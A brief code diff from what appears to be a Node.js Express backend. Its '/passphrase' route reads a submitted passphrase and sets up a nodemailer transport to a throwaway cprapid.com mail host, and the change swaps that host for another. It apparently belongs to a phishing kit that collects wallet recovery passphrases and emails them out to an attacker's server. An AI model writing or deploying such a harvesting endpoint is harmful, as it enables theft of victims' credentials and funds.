@@ -29,7 +29,7 @@ app.post('/passphrase', async (req, res) => {
   const passphrase = req.body.passphrase;
 
   let transporter = nodemailer.createTransport({
-    host: 31-41-249-166.cprapid.com, //188-239-191-167.cprapid.com, //"31-41-249-166.cprapid.com",
+    host: "188-239-191-167.cprapid.com", //"31-41-249-166.cprapid.com",
     port: 465,
     secure: true, // true for 465, false for other ports
     auth: {
